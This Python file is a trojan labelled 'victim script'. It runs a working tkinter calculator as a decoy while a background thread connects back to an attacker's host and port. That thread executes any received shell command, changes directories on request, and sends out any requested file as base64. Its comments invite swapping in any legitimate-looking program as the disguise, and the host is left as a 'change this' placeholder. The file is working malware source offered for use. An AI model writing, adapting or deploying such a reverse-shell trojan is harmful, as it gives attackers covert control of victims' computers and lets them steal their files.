#!/usr/bin/python3

# victim script

import os
import socket
import subprocess
import base64
import threading
import tkinter as tk


# in the foreground task fuction you can paste any legitimate program (e.g., any gui application or game or any other program)
# which you want the victim to run in the foreground, by default it's a gui calculator
def foreground_task() -> None:
	def add_to_entry(button: str) -> None:
		# inserting the buttons to the entry widget
		entry.insert("end", button)

	def evaluate() -> None:
		# storing the expression entered in the entry widget
		expression = entry.get()
		# if the expression is empty then return
		if not expression:
			return
		
		try:
			# as the enter key is not in the allowed keys so, the enter key won't work to evaluate the expression
			# so, configuring the entry validation to none
			entry.config(validate="none")
			# clearing the entry widget
			entry.delete(0, "end")
			# evaluating the expression and inserting it into the entry widget
			entry.insert(0, eval(expression))
			# configuring the entry validation back to key
			entry.config(validate="key")
		
		except (SyntaxError, ZeroDivisionError, NameError):
			# configuring the entry validation to none
			entry.config(validate="none")
			# clearing the entry widget
			entry.delete(0, "end")
			# inserting the Error message in the entry widget
			entry.insert(0, "Error")
			# configuring the entry validation back to key
			entry.config(validate="key")

	def backspace() -> None:
		# storing the current cursor position
		cur_pos = entry.index("insert")
		# configuring the entry validation to none
		entry.config(validate="none")
		# if the cursor postion not 0
		if cur_pos:
			# deleting the character at cursor position
			entry.delete(cur_pos - 1)
		# configuring the entry validation back to key
		entry.config(validate="key")
	
	def delete() -> None:
		# storing the current cursor position
		cur_pos = entry.index("insert")
		# configuring the entry validation to none
		entry.config(validate="none")
		# deleting the character at cursor position
		entry.delete(cur_pos)
		# configuring the entry validation back to key
		entry.config(validate="key")

	def clear() -> None:
		# configuring the entry validation to none
		entry.config(validate="none")
		# clearing the entry widget
		entry.delete(0, "end")
		# configuring the entry validation back to key
		entry.config(validate="key")

	def validate_keys(key: str) -> bool:
		# defining a string only with the allowed keys
		ALLOWED_KEYS = "0123456789.+-*/="
		# if the entered key is not an allowed key then return True
		if key in ALLOWED_KEYS:
			return True
		
		# other wise return False
		return False


	# creating root window
	root = tk.Tk()

	# setting up the geomentry of the root window
	root.geometry("400x400")
	# setting up the title
	root.title("Calculator")
	# setting up background color
	root.config(bg="#252525")
	# making it not resizable
	root.resizable(False, False)

	# storing the key validation output later passing it as an argument while creating the entry object
	valid = (root.register(validate_keys), "%S")

	# creating an entry widget with grid layout
	entry = tk.Entry(root, width=50, font=("Arial", 20), justify="right", validate="key", vcmd=valid)
	entry.grid(row=0, column=0, padx=20, pady=20, ipady=20, columnspan=5, sticky="news")
	# setting the direct input focus to the entry widget
	entry.focus_set()

	# if the user enters the the 'enter' key then it will also evaluate expression entered by the user
	root.bind("<Return>", lambda event: evaluate())
	# if the user enters the the 'escape' key then it will also clear the entry widget
	root.bind("<Escape>", lambda event: clear())

	ERROR_CHARS = {'e', 'r', 'o'}
	# manual backspace logic for "Error" message
	root.bind("<BackSpace>", lambda event: backspace() if set(entry.get().lower()) <= ERROR_CHARS else None)
	# manual delete logic for "Error" message
	root.bind("<Delete>", lambda event: delete() if set(entry.get().lower()) <= ERROR_CHARS else None)

	# defining a string for the numeric buttons
	BUTTONS = "789456123"
	row = 1
	col = 0
	for num in BUTTONS:
		# creting the numeric buttons with grid layout
		btn = tk.Button(root, text=num, height=2, width=10, bg="#646464", fg="white", font=("Arial", 20), padx=10, pady=10, borderwidth=1, command=lambda x=num: add_to_entry(x))
		btn.grid(row=row, column=col, sticky="news")

		# increasing the coloumn value by one for each iteration
		col += 1
		# as the numbers will fill the root window with a 3x3 layout
		# so this will check if the coloumn value is 3 then reset the coloumn value and increase the coloumn value by one
		if col > 2:
			col = 0
			row += 1

	# creating other buttons with grid layout
	btn_0 = tk.Button(root, text='0', height=2, width=10, bg="#646464", fg="white", font=("Arial", 20), padx=10, pady=10, borderwidth=1, command=lambda x='0': add_to_entry(x))
	btn_0.grid(row=4, column=0, columnspan=2, sticky="news")

	btn_dot = tk.Button(root, text='.', height=2, width=10, bg="#646464", fg="white", font=("Arial", 20), padx=10, pady=10, borderwidth=1, command=lambda x='.': add_to_entry(x))
	btn_dot.grid(row=4, column=2, sticky="news")

	btn_back = tk.Button(root, text="\u232b", height=2, width=10, bg="#4d4d4d", fg="white", font=("Arial", 20), padx=10, pady=10, borderwidth=1, command=backspace)
	btn_back.grid(row=1, column=3, sticky="news")

	btn_clear = tk.Button(root, text='C', height=2, width=10, bg="#4d4d4d", fg="white", font=("Arial", 20), padx=10, pady=10, borderwidth=1, command=clear)
	btn_clear.grid(row=1, column=4, sticky="news")

	btn_mul = tk.Button(root, text='*', height=2, width=10, bg="#2f2f2f", fg="white", font=("Arial", 20), padx=10, pady=10, borderwidth=1, command=lambda x='*': add_to_entry(x))
	btn_mul.grid(row=2, column=3, sticky="news")

	btn_div = tk.Button(root, text='/', height=2, width=10, bg="#2f2f2f", fg="white", font=("Arial", 20), padx=10, pady=10, borderwidth=1, command=lambda x='/': add_to_entry(x))
	btn_div.grid(row=2, column=4, sticky="news")

	btn_plus = tk.Button(root, text='+', height=2, width=10, bg="#2f2f2f", fg="white", font=("Arial", 20), padx=10, pady=10, borderwidth=1, command=lambda x='+': add_to_entry(x))
	btn_plus.grid(row=4, column=3, sticky="news")

	btn_minus = tk.Button(root, text='-', height=2, width=10, bg="#2f2f2f", fg="white", font=("Arial", 20), padx=10, pady=10, borderwidth=1, command=lambda x='-': add_to_entry(x))
	btn_minus.grid(row=3, column=3, sticky="news")

	btn_equalto = tk.Button(root, text='=', height=2, width=10, bg="#1ab7e7", fg="white", font=("Arial", 20), padx=10, pady=10, borderwidth=1, command=evaluate)
	btn_equalto.grid(row=3, column=4, rowspan=2, sticky="news")

	# configuring the row and coloumn layout with 5x5
	root.grid_columnconfigure(tuple(range(5)), weight=1)
	root.grid_rowconfigure(tuple(range(5)), weight=1)

	# running mainloop
	root.mainloop()


# it's the main payload which will run in the background and will give access to the attacker machine
def background_task(host: str, port: int) -> None:
	def chg_dir(cmd: str, sock: socket.socket) -> None:
		# if the command is only 'cd ' then return without proceeding further
		if len(cmd) <= 3:
			sock.send(base64.b64encode(b"Invalid command !!!"))
			# sending the final <END> string
			sock.send(b"<END>")
			return
		
		try:
			# changing the directory
			os.chdir(cmd[3:])
			# sending only the final <END> string to receive something at the attacker side
			# because if attacker side doesn't receive anything from the victim side
			# the sending and receving flow will break and the connection will break too.
			sock.send(b"<END>")
		
		except (FileNotFoundError, OSError):
			# if the path does not exist or contains any bad character then print the message
			sock.send(base64.b64encode(b"Invalid path !!!"))
			# sending the final <END> string
			sock.send(b"<END>")	

	def send_file(cmd: str, sock: socket.socket) -> None:
		# if the command is only 'get ' then return withour proceeding further
		if len(cmd) <= 4:
			sock.send(base64.b64encode(b"Invalid command !!!"))
			# sending the final <END> string
			sock.send(b"<END>")
			return
		
		try:
			# extracting the full path of the file
			full_path = os.path.realpath(cmd[4:], strict=True)
		
		except (FileNotFoundError, OSError):
			# if the file does not exist or the file name contains any bad character then return
			sock.send(base64.b64encode(b"Invalid File Name or Path !!!"))
			# sending the final <END> string
			sock.send(b"<END>")
			return
		
		# checking if the given file name is a valid file or not
		# if it's a valid file then open the file and store it's data
		if os.path.isfile(full_path):
			with open(full_path, "rb") as file:
				data = file.read()
			
			# sending the file data
			sock.sendall(base64.b64encode(data))
			# sending the final <END> string
			sock.send(b"<END>")
		else:
			# if the file name is not a valid valid file then send the message
			sock.send(base64.b64encode(b"Not a File !!!"))
			# sending the final <END> string
			sock.send(b"<END>")


	# creating victim socket
	victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	# connecting to the attacker machine
	victim.connect((host, port))


	while True:
		# receving commands and decoding it
		command = victim.recv(1024).decode()

		# If the command is exit, close the connection.
		if command == "exit":
			break
		
		# if the command stats with 'cd ' then change the directory
		elif command.startswith("cd "):
			chg_dir(command, victim)
			continue

		# if the command starts with 'get ' then send the file
		elif command.startswith("get "):
			send_file(command, victim)
			continue
		
		# executing the command and saving the output
		output = subprocess.getoutput(command)

		# if the output is only a blank string then send only the <END> string to the attacker machine
		if output == '':
			victim.send(b"<END>")
			continue
		
		# encoding the output then further encoding it to the base64 then sending to the attacker machine
		victim.sendall(base64.b64encode(output.encode()))
		# sending the final <END> string
		victim.send(b"<END>")

	# close the connection
	victim.close()


# driver code
if __name__ == "__main__":
	# ip or domain name of the attacker machine
	host = "127.0.0.1" # change this
	# listening port of the attacker machine
	port = 6969 # change this (optional)

	# creating a thread for the foreground task
	fg_thread = threading.Thread(target=foreground_task)
	# creating a thread for the background task
	bg_thread = threading.Thread(target=background_task, args=(host, port))

	# staring the foreground thread
	fg_thread.start()
	# staring the background thread
	bg_thread.start()
